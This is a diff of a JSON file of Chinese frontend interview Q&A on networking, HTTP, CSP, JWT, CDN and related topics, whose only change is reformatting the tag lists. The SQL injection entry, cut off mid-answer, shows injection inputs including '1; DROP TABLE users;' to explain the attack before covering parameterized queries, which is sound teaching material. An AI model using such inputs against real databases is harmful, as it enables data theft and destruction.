     "answer": "## 长轮询（Long Polling）\n\n### 普通轮询\n```js\n// 客户端每隔一段时间发送请求\nsetInterval(async () => {\n  const res = await fetch('/api/messages');\n  const data = await res.json();\n  updateMessages(data);\n}, 1000);\n\n// 缺点：浪费带宽，即使没有新消息也发请求\n```\n\n### 长轮询\n```js\n// 客户端发起请求，服务器挂起直到有新数据或超时\nasync function longPoll() {\n  try {\n    const res = await fetch('/api/messages/poll', {\n      signal: AbortSignal.timeout(30000) // 30s 超时\n    });\n    const data = await res.json();\n    handleNewMessage(data);\n  } catch (e) {\n    // 超时或错误\n  } finally {\n    longPoll(); // 立即发起下一次请求\n  }\n}\n\nlongPoll();\n```\n\n```js\n// 服务端（Node.js）\nconst clients = new Map();\n\napp.get('/api/messages/poll', (req, res) => {\n  const clientId = req.query.clientId;\n  const timeout = setTimeout(() => {\n    clients.delete(clientId);\n    res.json({ messages: [] }); // 超时返回空\n  }, 25000);\n\n  clients.set(clientId, { res, timeout });\n});\n\n// 有新消息时推送\nfunction broadcast(message) {\n  clients.forEach(({ res, timeout }, clientId) => {\n    clearTimeout(timeout);\n    clients.delete(clientId);\n    res.json({ messages: [message] });\n  });\n}\n```\n\n### 三种方案对比\n| | 短轮询 | 长轮询 | WebSocket |\n|--|--------|--------|----------|\n| 实时性 | 差 | 较好 | 最好 |\n| 服务器压力 | 大 | 中 | 小 |\n| 实现复杂度 | 低 | 中 | 高 |\n| HTTP 兼容 | ✅ | ✅ | 需升级 |\n| 适用场景 | 低频更新 | 中频更新 | 高频双向 |",
-    "tags": [
-      "长轮询",
-      "轮询",
-      "WebSocket",
-      "实时通信"
-    ],
+    "tags": ["长轮询", "轮询", "WebSocket", "实时通信"],
     "source": "高频"
   },
   {
@@ -230,12 +149,7 @@
     "difficulty": 2,
     "question": "Content Security Policy（CSP）是什么？如何配置？",
     "answer": "## Content Security Policy（CSP）\n\n### 概念\nCSP 是一种安全策略，通过 HTTP 响应头或 meta 标签，告诉浏览器允许加载哪些来源的资源，防止 XSS 攻击。\n\n### 配置方式\n```html\n<!-- 方式1：meta 标签 -->\n<meta http-equiv=\"Content-Security-Policy\"\n      content=\"default-src 'self'; script-src 'self' 'nonce-abc123'\">\n```\n\n```nginx\n# 方式2：HTTP 响应头（推荐）\nContent-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com\n```\n\n### 常用指令\n```\ndefault-src    - 默认来源（其他指令未指定时使用）\nscript-src     - JS 来源\nstyle-src      - CSS 来源\nimg-src        - 图片来源\nfont-src       - 字体来源\nconnect-src    - XHR/fetch/WebSocket 目标\nframe-src      - iframe 来源\nbase-uri       - <base> 标签限制\nform-action    - 表单提交目标\n```\n\n### 来源值\n```\n'self'          - 同源\n'none'          - 不允许任何来源\n'unsafe-inline' - 允许内联（不推荐）\n'unsafe-eval'   - 允许 eval（不推荐）\n'nonce-{value}' - 允许带特定 nonce 的内联脚本\n'sha256-{hash}' - 允许特定哈希的内联脚本\nhttps:          - 允许所有 HTTPS 来源\nhttps://cdn.example.com - 指定域名\n```\n\n### 实际配置示例\n```\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-${SERVER_GENERATED_NONCE}' https://cdn.example.com;\n  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;\n  font-src 'self' https://fonts.gstatic.com;\n  img-src 'self' data: https:;\n  connect-src 'self' https://api.example.com wss://ws.example.com;\n  frame-ancestors 'none';\n  base-uri 'self';\n  form-action 'self';\n```\n\n### Report-Only 模式（调试）\n```\nContent-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violation\n```\n只报告违规，不阻止，用于逐步迁移",
-    "tags": [
-      "CSP",
-      "安全",
-      "XSS防御",
-      "HTTP头"
-    ],
+    "tags": ["CSP", "安全", "XSS防御", "HTTP头"],
     "source": "高频"
   },
   {
@@ -244,12 +158,7 @@
     "difficulty": 2,
     "question": "TCP 和 UDP 的区别？各自适用什么场景？",
     "answer": "## TCP vs UDP\n\n### TCP（Transmission Control Protocol）\n**特点：面向连接、可靠传输、有序、流量控制**\n\n```\n可靠性机制：\n1. 三次握手建立连接\n2. 序列号+确认号（ACK）确保数据有序到达\n3. 超时重传（未收到 ACK 则重发）\n4. 流量控制（滑动窗口，防止接收方缓冲区溢出）\n5. 拥塞控制（慢启动、拥塞避免、快重传、快恢复）\n6. 四次挥手断开连接\n```\n\n### UDP（User Datagram Protocol）\n**特点：无连接、不可靠、无序、速度快**\n\n```\n特点：\n1. 不需要建立连接，直接发送\n2. 无确认机制，不保证到达\n3. 无序（包可能乱序到达）\n4. 无流量控制\n5. 头部只有 8 字节（TCP 最小 20 字节）\n```\n\n### 对比\n| | TCP | UDP |\n|--|-----|-----|\n| 连接 | 面向连接 | 无连接 |\n| 可靠性 | 可靠 | 不可靠 |\n| 顺序 | 有序 | 无序 |\n| 速度 | 较慢 | 快 |\n| 开销 | 大 | 小 |\n\n### 适用场景\n\n**TCP 适用**\n```\n- HTTP/HTTPS（网页浏览）\n- SMTP/POP3（邮件）\n- FTP（文件传输）\n- SSH（远程登录）\n\n→ 需要数据完整性的场景\n```\n\n**UDP 适用**\n```\n- DNS（简单查询，应用层可重试）\n- 视频直播/视频通话（丢帧可接受，延迟不可接受）\n- 在线游戏（低延迟优先）\n- HTTP/3（QUIC 基于 UDP，自行实现可靠性）\n\n→ 对延迟敏感、可以容忍少量丢包的场景\n```",
-    "tags": [
-      "TCP",
-      "UDP",
-      "网络协议",
-      "传输层"
-    ],
+    "tags": ["TCP", "UDP", "网络协议", "传输层"],
     "source": "高频"
   },
   {
@@ -258,12 +167,7 @@
     "difficulty": 2,
     "question": "什么是 JWT？它的工作原理和安全注意事项？",
     "answer": "## JWT（JSON Web Token）\n\n### 结构\nJWT 由三部分组成，用 `.` 分隔：`Header.Payload.Signature`\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n.eyJ1c2VySWQiOiIxMjMiLCJpYXQiOjE3MDA4MDAwMDAsImV4cCI6MTcwMDg4NjQwMH0\n.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n```\n\n```js\n// Header（Base64编码）\n{\n  \"alg\": \"HS256\",  // 签名算法\n  \"typ\": \"JWT\"\n}\n\n// Payload（Base64编码，不要放敏感信息！）\n{\n  \"userId\": \"123\",\n  \"role\": \"admin\",\n  \"iat\": 1700800000,  // 签发时间\n  \"exp\": 1700886400   // 过期时间\n}\n\n// Signature\nHMACSHA256(\n  base64(header) + '.' + base64(payload),\n  secret  // 服务器密钥\n)\n```\n\n### 工作流程\n```\n1. 用户登录（POST /login）\n2. 服务器验证密码，生成 JWT，返回给客户端\n3. 客户端存储 JWT（localStorage 或 Cookie）\n4. 后续请求在 Authorization Header 携带\n   Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...\n5. 服务器验证签名，解码 Payload，确认身份\n```\n\n### 服务端实现\n```js\nimport jwt from 'jsonwebtoken';\n\nconst SECRET = process.env.JWT_SECRET;\n\n// 生成\nconst token = jwt.sign({ userId: user.id, role: user.role }, SECRET, {\n  expiresIn: '24h'\n});\n\n// 验证\ntry {\n  const decoded = jwt.verify(token, SECRET);\n  console.log(decoded.userId);\n} catch (e) {\n  // 验证失败（过期或签名错误）\n}\n```\n\n### 安全注意事项\n```\n1. 不要在 Payload 存密码等敏感信息（Base64 可解码）\n2. 使用 HTTPS 传输\n3. 设置合理的过期时间（access token 短，refresh token 长）\n4. 存储：\n   - Cookie（HttpOnly + Secure）：防 XSS，但有 CSRF 风险\n   - localStorage：有 XSS 风险，无 CSRF 风险\n5. 黑名单机制（需要主动失效时）\n6. 使用 RS256（非对称）而非 HS256，避免密钥泄露\n```",
-    "tags": [
-      "JWT",
-      "Token",
-      "认证",
-      "安全"
-    ],
+    "tags": ["JWT", "Token", "认证", "安全"],
     "source": "高频"
   },
   {
@@ -272,12 +176,7 @@
     "difficulty": 2,
     "question": "HTTP 请求头和响应头有哪些常见字段？",
     "answer": "## 常见 HTTP Header\n\n### 通用头（请求和响应都有）\n```\nCache-Control   - 缓存控制\nConnection      - 连接管理（keep-alive / close）\nDate            - 消息发送日期\nTransfer-Encoding - 传输编码（chunked）\n```\n\n### 请求头\n```\nAccept              - 期望的响应类型（text/html, application/json）\nAccept-Encoding     - 支持的压缩格式（gzip, br, deflate）\nAccept-Language     - 期望的语言（zh-CN, en-US）\nAuthorization       - 认证信息（Bearer token）\nContent-Type        - 请求体类型（application/json）\nContent-Length      - 请求体大小\nCookie              - 携带 Cookie\nHost                - 服务器主机名（必须）\nOrigin              - 跨域请求来源\nReferer             - 来源页面 URL\nUser-Agent          - 客户端信息（浏览器/OS）\nIf-None-Match       - 协商缓存（ETag）\nIf-Modified-Since   - 协商缓存（时间）\nX-Requested-With    - 标识 AJAX 请求\n```\n\n### 响应头\n```\nAccess-Control-Allow-Origin  - CORS 允许来源\nContent-Encoding             - 内容压缩方式（gzip）\nContent-Type                 - 响应体类型（+ charset）\nContent-Length               - 响应体大小\nETag                         - 资源版本标识\nLast-Modified                - 资源最后修改时间\nLocation                     - 重定向目标 URL\nSet-Cookie                   - 设置 Cookie\nStrict-Transport-Security    - HSTS（强制 HTTPS）\nX-Frame-Options              - 防止 iframe 嵌入\nX-Content-Type-Options       - 防止 MIME 嗅探\n```\n\n### 常用安全头\n```\nStrict-Transport-Security: max-age=31536000; includeSubDomains\n  → 强制使用 HTTPS 一年\n\nX-Frame-Options: DENY\n  → 禁止任何页面嵌入为 iframe\n\nX-Content-Type-Options: nosniff\n  → 禁止浏览器猜测 Content-Type\n\nContent-Security-Policy: default-src 'self'\n  → 只允许加载同源资源\n\nReferrer-Policy: strict-origin-when-cross-origin\n  → 控制 Referer 信息\n```",
-    "tags": [
-      "HTTP",
-      "请求头",
-      "响应头",
-      "安全头"
-    ],
+    "tags": ["HTTP", "请求头", "响应头", "安全头"],
     "source": "高频"
   },
   {
@@ -286,11 +185,7 @@
     "difficulty": 2,
     "question": "什么是 RESTful API？有哪些设计原则？",
     "answer": "## RESTful API\n\n### REST 原则\n1. **统一接口**：使用标准 HTTP 方法\n2. **无状态**：每个请求包含所有必要信息\n3. **可缓存**：响应明确是否可缓存\n4. **客户端-服务器分离**：前后端独立\n5. **分层系统**：客户端不知道是否直接连接终端服务器\n\n### HTTP 方法语义\n```\nGET    /users      - 获取用户列表\nGET    /users/:id  - 获取特定用户\nPOST   /users      - 创建用户\nPUT    /users/:id  - 完整更新用户（幂等）\nPATCH  /users/:id  - 部分更新用户（幂等）\nDELETE /users/:id  - 删除用户（幂等）\n```\n\n### URL 设计规范\n```\n✅ 好的实践\nGET    /articles              # 资源集合（名词复数）\nGET    /articles/1            # 特定资源\nGET    /articles/1/comments   # 嵌套资源\nPOST   /articles/1/publish    # 非 CRUD 操作用动词\n\n❌ 不好的实践\nGET    /getArticles           # URL 中含动词\nGET    /article               # 单数\nPOST   /deleteArticle?id=1    # 用错方法\n```\n\n### 状态码使用\n```\nPOST 创建成功  → 201 Created，Location: /users/1\nGET 成功       → 200 OK\nPUT/PATCH 成功 → 200 OK 或 204 No Content\nDELETE 成功   → 204 No Content\n\n参数错误       → 400 Bad Request\n未认证         → 401 Unauthorized\n无权限         → 403 Forbidden\n资源不存在     → 404 Not Found\n```\n\n### 版本控制\n```\n# 方案1：URL 路径\n/api/v1/users\n/api/v2/users\n\n# 方案2：请求头\nAccept: application/vnd.api+json; version=1\n\n# 方案3：查询参数\n/api/users?version=1\n```\n\n### 分页\n```\nGET /articles?page=2&limit=20\nGET /articles?cursor=eyJpZCI6MTAwfQ\n\n响应：\n{\n  \"data\": [...],\n  \"pagination\": {\n    \"total\": 1000,\n    \"page\": 2,\n    \"limit\": 20,\n    \"totalPages\": 50\n  }\n}\n```",
-    "tags": [
-      "RESTful",
-      "API设计",
-      "HTTP方法"
-    ],
+    "tags": ["RESTful", "API设计", "HTTP方法"],
     "source": "高频"
   },
   {
@@ -299,12 +194,7 @@
     "difficulty": 2,
     "question": "前端如何实现文件上传？有哪些注意事项？",
     "answer": "## 前端文件上传\n\n### 基础上传（FormData）\n```jsx\nfunction FileUpload() {\n  const handleUpload = async (e) => {\n    const file = e.target.files[0];\n    if (!file) return;\n\n    const formData = new FormData();\n    formData.append('file', file);\n    formData.append('userId', '123');\n\n    const res = await fetch('/api/upload', {\n      method: 'POST',\n      body: formData\n      // 不要手动设置 Content-Type，让浏览器自动处理 boundary\n    });\n\n    const data = await res.json();\n    console.log('上传成功:', data.url);\n  };\n\n  return <input type=\"file\" onChange={handleUpload} />;\n}\n```\n\n### 显示上传进度\n```js\nfunction uploadWithProgress(file, onProgress) {\n  return new Promise((resolve, reject) => {\n    const xhr = new XMLHttpRequest();\n    const formData = new FormData();\n    formData.append('file', file);\n\n    xhr.upload.addEventListener('progress', (e) => {\n      if (e.lengthComputable) {\n        const percent = Math.round(e.loaded / e.total * 100);\n        onProgress(percent);\n      }\n    });\n\n    xhr.addEventListener('load', () => resolve(JSON.parse(xhr.responseText)));\n    xhr.addEventListener('error', reject);\n\n    xhr.open('POST', '/api/upload');\n    xhr.send(formData);\n  });\n}\n\n// fetch 目前不支持上传进度，需用 XMLHttpRequest\n```\n\n### 文件类型和大小校验\n```js\nconst MAX_SIZE = 10 * 1024 * 1024; // 10MB\nconst ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp'];\n\nfunction validateFile(file) {\n  if (!ALLOWED_TYPES.includes(file.type)) {\n    throw new Error(`不支持的文件类型：${file.type}`);\n  }\n  if (file.size > MAX_SIZE) {\n    throw new Error(`文件过大：${(file.size / 1024 / 1024).toFixed(1)}MB，限制 10MB`);\n  }\n}\n```\n\n### 拖拽上传\n```jsx\nfunction DropZone({ onUpload }) {\n  const [isDragging, setIsDragging] = useState(false);\n\n  const handleDrop = (e) => {\n    e.preventDefault();\n    setIsDragging(false);\n    const files = Array.from(e.dataTransfer.files);\n    files.forEach(onUpload);\n  };\n\n  return (\n    <div\n      onDragOver={(e) => { e.preventDefault(); setIsDragging(true); }}\n      onDragLeave={() => setIsDragging(false)}\n      onDrop={handleDrop}\n      style={{ border: isDragging ? '2px dashed blue' : '2px dashed gray' }}\n    >\n      拖放文件到这里\n    </div>\n  );\n}\n```\n\n### 图片预览\n```js\nfunction previewImage(file) {\n  return new Promise((resolve) => {\n    const reader = new FileReader();\n    reader.onload = (e) => resolve(e.target.result);\n    reader.readAsDataURL(file);\n  });\n}\n// 或\nconst url = URL.createObjectURL(file); // 更高效，不读取文件内容\n// 用完后释放\nURL.revokeObjectURL(url);\n```",
-    "tags": [
-      "文件上传",
-      "FormData",
-      "XMLHttpRequest",
-      "拖拽上传"
-    ],
+    "tags": ["文件上传", "FormData", "XMLHttpRequest", "拖拽上传"],
     "source": "高频"
   },
   {
@@ -313,12 +203,7 @@
     "difficulty": 2,
     "question": "Fetch API 和 XMLHttpRequest 的区别是什么？",
     "answer": "## Fetch API vs XMLHttpRequest\n\n### XHR（XMLHttpRequest）\n```js\nfunction xhrRequest(url) {\n  return new Promise((resolve, reject) => {\n    const xhr = new XMLHttpRequest();\n    xhr.open('GET', url);\n    xhr.setRequestHeader('Authorization', `Bearer ${token}`);\n\n    xhr.onload = () => {\n      if (xhr.status >= 200 && xhr.status < 300) {\n        resolve(JSON.parse(xhr.responseText));\n      } else {\n        reject(new Error(`HTTP Error: ${xhr.status}`));\n      }\n    };\n\n    xhr.onerror = () => reject(new Error('Network Error'));\n    xhr.ontimeout = () => reject(new Error('Timeout'));\n    xhr.timeout = 5000;\n\n    xhr.send();\n  });\n}\n```\n\n### Fetch API\n```js\nasync function fetchRequest(url) {\n  const res = await fetch(url, {\n    method: 'GET',\n    headers: { 'Authorization': `Bearer ${token}` },\n    signal: AbortSignal.timeout(5000) // 超时\n  });\n\n  if (!res.ok) {\n    throw new Error(`HTTP Error: ${res.status}`);\n  }\n\n  return res.json();\n}\n```\n\n### 主要区别\n| | XHR | Fetch |\n|--|-----|-------|\n| 语法 | 事件回调 | Promise（简洁）|\n| 返回 | 无 | Promise |\n| 上传进度 | ✅ xhr.upload.onprogress | ❌（目前不支持）|\n| 取消请求 | xhr.abort() | AbortController |\n| Cookie | 默认携带 | 默认不携带（需 credentials）|\n| 错误处理 | status 非 2xx 不算错误 | 同左（需手动判断）|\n| 流式响应 | ❌ | ✅ response.body |\n| 兼容性 | 所有浏览器 | IE 不支持 |\n\n### Fetch 注意事项\n```js\n// 1. HTTP 错误不会 reject\nconst res = await fetch('/api');\nif (!res.ok) throw new Error('Error'); // 必须手动判断\n\n// 2. 默认不携带 Cookie\nfetch('/api', { credentials: 'include' });\n\n// 3. 取消请求\nconst controller = new AbortController();\nfetch('/api', { signal: controller.signal });\ncontroller.abort(); // 取消\n\n// 4. 流式读取响应\nconst reader = res.body.getReader();\nwhile (true) {\n  const { done, value } = await reader.read();\n  if (done) break;\n  process(value); // Uint8Array\n}\n```",
-    "tags": [
-      "Fetch",
-      "XMLHttpRequest",
-      "AJAX",
-      "网络请求"
-    ],
+    "tags": ["Fetch", "XMLHttpRequest", "AJAX", "网络请求"],
     "source": "高频"
   },
   {
@@ -327,12 +212,7 @@
     "difficulty": 2,
     "question": "什么是 CDN？CDN 如何工作？",
     "answer": "## CDN（Content Delivery Network）\n\n### 工作原理\n```\n传统方式：所有用户 → 同一台源站服务器\n问题：物理距离导致延迟，服务器压力大\n\nCDN 方式：\n用户请求 → DNS 智能解析 → 最近的 CDN 节点\n                          ├── 有缓存 → 直接返回\n                          └── 无缓存 → 回源（Origin Server）→ 缓存 → 返回\n```\n\n### 核心技术\n\n**1. 智能 DNS 解析**\n```\n根据用户 IP 地理位置，返回最近 CDN 节点 IP\n北京用户 → 北京 CDN 节点 IP\n上海用户 → 上海 CDN 节点 IP\n```\n\n**2. 缓存层次**\n```\nL1 Edge（边缘节点）← 最靠近用户\n  ↑ 未命中\nL2 Regional（区域节点）\n  ↑ 未命中\nOrigin Server（源站）\n```\n\n**3. 回源策略**\n```\nCache-Control: max-age=86400, s-maxage=31536000\n  → s-maxage：CDN 专用缓存时间（覆盖 max-age）\n  → 客户端缓存 1 天，CDN 缓存 1 年\n```\n\n### 前端最佳实践\n```js\n// vite.config.js\nexport default {\n  base: 'https://cdn.example.com/static/', // 静态资源 CDN 域名\n  build: {\n    rollupOptions: {\n      output: {\n        // 带 hash 的文件名，方便长期缓存\n        entryFileNames: '[name].[hash].js',\n        chunkFileNames: '[name].[hash].js',\n        assetFileNames: '[name].[hash].[ext]'\n      }\n    }\n  }\n};\n```\n\n### CDN 的好处\n- 降低延迟（物理距离近）\n- 减轻源站压力\n- 提高可用性（多节点冗余）\n- 防 DDoS（流量分散到多节点）\n- 支持图片处理（裁剪、格式转换）\n\n### 注意事项\n```\n- CDN 域名跨域时需配置 CORS 头\n- 字体文件需要 CORS 才能跨域加载\n- 文件名带 hash 才能长期缓存\n- 需要监控 CDN 命中率（目标 > 90%）\n```",
-    "tags": [
-      "CDN",
-      "缓存",
-      "性能优化",
-      "网络"
-    ],
+    "tags": ["CDN", "缓存", "性能优化", "网络"],
     "source": "高频"
   },
   {
@@ -341,13 +221,7 @@
     "difficulty": 2,
     "question": "浏览器输入 URL 到页面显示，整个过程发生了什么？",
     "answer": "## 从 URL 输入到页面显示\n\n### 完整流程\n\n**1. URL 解析**\n```\n解析 URL 各部分：协议、域名、端口、路径、参数、锚点\nhttps://www.example.com:443/path?query=1#hash\n```\n\n**2. 检查缓存**\n```\n浏览器检查是否有该 URL 的缓存\n→ 有且未过期（强缓存）→ 直接使用\n→ 其他情况 → 继续网络请求\n```\n\n**3. DNS 解析**\n```\n浏览器缓存 → 系统缓存 → hosts 文件\n→ ISP DNS → 根域名服务器 → TLD → 权威 DNS\n→ 获得 IP 地址\n```\n\n**4. TCP 建立连接**\n```\n三次握手建立 TCP 连接\nHTTPS 还需要 TLS 握手（TLS 1.2: 2-RTT, TLS 1.3: 1-RTT）\n```\n\n**5. 发送 HTTP 请求**\n```\nGET /path?query=1 HTTP/2\nHost: www.example.com\nAccept: text/html\nUser-Agent: Chrome/...\nCookie: session=abc\n```\n\n**6. 服务器处理并响应**\n```\nHTTP/2 200 OK\nContent-Type: text/html; charset=UTF-8\nCache-Control: no-cache\n\n<html>...</html>\n```\n\n**7. 浏览器渲染**\n```\na. HTML 解析 → DOM 树\nb. CSS 解析 → CSSOM 树\nc. DOM + CSSOM → Render 树\nd. Layout（布局）：计算位置和大小\ne. Paint（绘制）：生成绘制指令\nf. Composite（合成）：GPU 合成图层\ng. 显示到屏幕\n```\n\n**8. 加载子资源**\n```\n并行加载 CSS、JS、图片\nCSS：下载后解析，阻塞渲染\nJS：defer/async 控制加载时机\n```\n\n**9. 执行 JS**\n```\nDOMContentLoaded → DOM 解析完成\nload → 所有资源（图片等）加载完成\n```\n\n### 优化入口\n```\n- DNS 预解析：<link rel=\"dns-prefetch\">\n- 提前建连：<link rel=\"preconnect\">\n- CDN 加速：减少网络延迟\n- 缓存：减少重复请求\n- HTTP/2：多路复用\n- 关键 CSS 内联：减少阻塞\n```",
-    "tags": [
-      "网络",
-      "浏览器渲染",
-      "DNS",
-      "TCP",
-      "综合"
-    ],
+    "tags": ["网络", "浏览器渲染", "DNS", "TCP", "综合"],
     "source": "高频"
   },
   {
@@ -356,12 +230,7 @@
     "difficulty": 2,
     "question": "什么是 OSI 七层模型和 TCP/IP 四层模型？",
     "answer": "## 网络模型\n\n### OSI 七层模型\n```\n7. 应用层（Application）     HTTP、FTP、DNS、SMTP\n6. 表示层（Presentation）    加密、编码转换（SSL/TLS 在此层）\n5. 会话层（Session）         建立/管理/终止会话\n4. 传输层（Transport）       TCP、UDP（端对端通信）\n3. 网络层（Network）         IP、ICMP、路由（主机到主机）\n2. 数据链路层（Data Link）   MAC 地址、以太网、Wi-Fi\n1. 物理层（Physical）        比特流、网线、光纤\n```\n\n### TCP/IP 四层模型\n```\n4. 应用层      对应 OSI 的 5、6、7 层\n   → HTTP/HTTPS、WebSocket、DNS、FTP、SMTP\n\n3. 传输层      对应 OSI 第 4 层\n   → TCP（可靠）、UDP（不可靠）\n\n2. 网络层      对应 OSI 第 3 层\n   → IP、ICMP（ping）、ARP\n\n1. 网络接口层  对应 OSI 的 1、2 层\n   → 以太网、Wi-Fi、MAC 地址\n```\n\n### 数据传输过程\n```\n发送方（封装）：\n应用层数据 → 加传输层头 → 加网络层头 → 加链路层头\n\n接收方（解封装）：\n链路层头 → 网络层头 → 传输层头 → 应用层数据\n\n每一层只关心本层的头信息，向下透明\n```\n\n### 常见协议对应\n```\n应用层：HTTP(80) HTTPS(443) FTP(21) SSH(22) DNS(53)\n传输层：TCP UDP\n网络层：IPv4 IPv6 ICMP\n链路层：Ethernet Wi-Fi\n```\n\n### 记忆口诀\n```\n七层：物数网传会表应\n（物理、数据链路、网络、传输、会话、表示、应用）\n```",
-    "tags": [
-      "OSI",
-      "TCP/IP",
-      "网络模型",
-      "协议"
-    ],
+    "tags": ["OSI", "TCP/IP", "网络模型", "协议"],
     "source": "高频"
   },
   {
@@ -370,13 +239,7 @@
     "difficulty": 2,
     "question": "什么是 HTTPS 证书？如何验证证书有效性？",
     "answer": "## HTTPS 证书\n\n### 数字证书（X.509）\n```\n证书包含：\n- 持有者信息（域名、组织）\n- 公钥\n- 有效期\n- 签发机构（CA）\n- CA 的数字签名\n```\n\n### 证书链（Chain of Trust）\n```\n根证书（Root CA）\n  ↓ 签发\n中间证书（Intermediate CA）\n  ↓ 签发\n服务器证书（End-Entity Certificate）\n\n浏览器内置了根证书列表\n→ 根证书可信 → 中间证书可信 → 服务器证书可信\n```\n\n### 证书验证过程\n```\n1. 下载服务器证书\n2. 验证证书有效期\n3. 验证域名匹配（CN 或 SAN 字段）\n4. 验证证书链（到根证书）\n5. 使用 CA 公钥验证证书签名\n6. 检查证书是否被吊销（CRL 或 OCSP）\n```\n\n### 证书类型\n```\nDV（Domain Validation）\n  → 只验证域名所有权（自动颁发，如 Let's Encrypt）\n  → 地址栏显示锁图标\n\nOV（Organization Validation）\n  → 验证域名 + 组织信息\n  → 证书包含公司名称\n\nEV（Extended Validation）\n  → 最严格，验证公司实体\n  → 地址栏显示公司名称\n  → 银行、金融机构使用\n```\n\n### 证书吊销\n```\nCRL（Certificate Revocation List）\n→ 定期下载吊销列表，缺点：不实时\n\nOCSP（Online Certificate Status Protocol）\n→ 实时查询证书状态\n\nOCSP Stapling\n→ 服务器预先获取 OCSP 响应并附在握手中，提高性能\n```\n\n### 免费证书（Let's Encrypt）\n```bash\n# Certbot 自动申请 SSL 证书\ncertbot --nginx -d example.com -d www.example.com\n```",
-    "tags": [
-      "HTTPS",
-      "证书",
-      "CA",
-      "TLS",
-      "安全"
-    ],
+    "tags": ["HTTPS", "证书", "CA", "TLS", "安全"],
     "source": "高频"
   },
   {
@@ -385,12 +248,7 @@
     "difficulty": 2,
     "question": "什么是 HTTP 的 Keep-Alive？",
     "answer": "## HTTP Keep-Alive（持久连接）\n\n### 背景\nHTTP/1.0 默认每次请求都需要新建 TCP 连接，请求结束后关闭。频繁建立和关闭连接开销大。\n\n### Keep-Alive\nHTTP/1.1 默认开启持久连接，一个 TCP 连接可以发送多个 HTTP 请求。\n\n```\nHTTP/1.0 without keep-alive:\n[TCP握手] → [请求] → [响应] → [断开]\n[TCP握手] → [请求] → [响应] → [断开]\n\nHTTP/1.1 with keep-alive:\n[TCP握手] → [请求1] → [响应1] → [请求2] → [响应2] → ... → [断开]\n```\n\n### 相关头部\n```\n# 请求头\nConnection: keep-alive\nKeep-Alive: timeout=5, max=100\n  → timeout：空闲超时时间（秒）\n  → max：最多复用请求数\n\n# 响应头\nConnection: keep-alive\n\n# 关闭持久连接\nConnection: close\n```\n\n### HTTP/1.1 的流水线问题\n```\n虽然可以复用连接，但请求仍然是串行的：\n请求A → 必须等响应A → 请求B → 等响应B\n\n→ 队头阻塞（HOL Blocking）\n\nHTTP/2 用多路复用彻底解决：\n请求A、B、C 同时发出，响应乱序返回\n```\n\n### Node.js Keep-Alive\n```js\nimport http from 'http';\n\nconst agent = new http.Agent({\n  keepAlive: true,\n  maxSockets: 10,     // 最大并发连接数\n  keepAliveMsecs: 30000  // 保活时间\n});\n\nfetch('https://api.example.com/data', { agent });\n```\n\n### Nginx 配置\n```nginx\nkeepalive_timeout 65s;     # 客户端连接保持时间\nkeepalive_requests 100;    # 每个连接最多请求数\n\nupstream backend {\n  server localhost:3000;\n  keepalive 32;            # 与上游保持的连接数\n}\n```",
-    "tags": [
-      "HTTP",
-      "Keep-Alive",
-      "持久连接",
-      "性能"
-    ],
+    "tags": ["HTTP", "Keep-Alive", "持久连接", "性能"],
     "source": "高频"
   },
   {
@@ -399,12 +257,7 @@
     "difficulty": 3,
     "question": "详细讲解 TCP 的拥塞控制算法",
     "answer": "## TCP 拥塞控制\n\n### 概念\n拥塞控制防止发送方发送过多数据导致网络拥塞，通过拥塞窗口（cwnd）动态调整发送速率。\n\n### 四个阶段\n\n**1. 慢启动（Slow Start）**\n```\n初始 cwnd = 1 MSS（最大报文段）\n每收到一个 ACK：cwnd += 1 MSS\n→ 指数增长（每 RTT 翻倍）\n→ 增长到 ssthresh（慢启动阈值）时进入拥塞避免\n\ncwnd: 1 → 2 → 4 → 8 → 16 → ssthresh\n```\n\n**2. 拥塞避免（Congestion Avoidance）**\n```\n每个 RTT：cwnd += 1 MSS\n→ 线性增长（比慢启动保守）\n→ 直到检测到拥塞（丢包）\n\ncwnd: ssthresh → ssthresh+1 → ssthresh+2 → ...\n```\n\n**3. 快重传（Fast Retransmit）**\n```\n收到 3 个重复 ACK → 立即重传丢失的包\n（不等超时）\n```\n\n**4. 快恢复（Fast Recovery，Tahoe vs Reno）**\n\n**TCP Tahoe**\n```\n超时或收到 3 个重复 ACK：\n→ ssthresh = cwnd / 2\n→ cwnd = 1（重新慢启动）\n```\n\n**TCP Reno（改进）**\n```\n收到 3 个重复 ACK（快重传触发）：\n→ ssthresh = cwnd / 2\n→ cwnd = ssthresh（快恢复，跳过慢启动）\n\n超时（更严重）：\n→ ssthresh = cwnd / 2\n→ cwnd = 1（回到慢启动）\n```\n\n### CUBIC（现代 Linux 默认）\n```\n使用三次函数曲线调整 cwnd\n→ 丢包后恢复更快\n→ 高带宽长延迟网络（BDP 大）性能更好\n```\n\n### BBR（Google 2016）\n```\n基于带宽测量而非丢包\n→ 在高丢包环境（卫星、Wi-Fi）性能更好\n→ YouTube 等大规模使用\n```",
-    "tags": [
-      "TCP",
-      "拥塞控制",
-      "慢启动",
-      "网络协议"
-    ],
+    "tags": ["TCP", "拥塞控制", "慢启动", "网络协议"],
     "source": "高频"
   },
   {
@@ -413,12 +266,7 @@
     "difficulty": 3,
     "question": "什么是 SQL 注入？前端如何防御？",
     "answer": "## SQL 注入\n\n### 概念\nSQL 注入是攻击者通过在用户输入中注入 SQL 代码，操纵数据库查询的攻击方式。\n\n### 攻击示例\n```sql\n-- 正常查询：SELECT * FROM users WHERE id = 1\n-- 攻击输入：1 OR 1=1\n\n-- 拼接后：SELECT * FROM users WHERE id = 1 OR 1=1\n-- 结果：返回所有用户！\n\n-- 更危险：1; DROP TABLE users;\n-- SELECT * FROM users WHERE id = 1; DROP TABLE users;\n```\n\n### 防御措施\n\n**1. 使用参数化查询（根本防御）**\n```js\n// ❌ 危险：字符串拼接\nconst query = `SELECT * FROM users WHERE id = ${userId}`;\n\n// ✅ 安全：参数化查询（ORM/prepared statements）\n// MySQL2\nconst [rows] = await db.execute(\n  'SELECT * FROM users WHERE id = ?',\n  [userId]\n);\n\n// Prisma ORM\nconst user = await prisma.user.findUnique({\n  where: { id: userId }\n});\n```\n\n**2. 使用 ORM**\n```js\n// 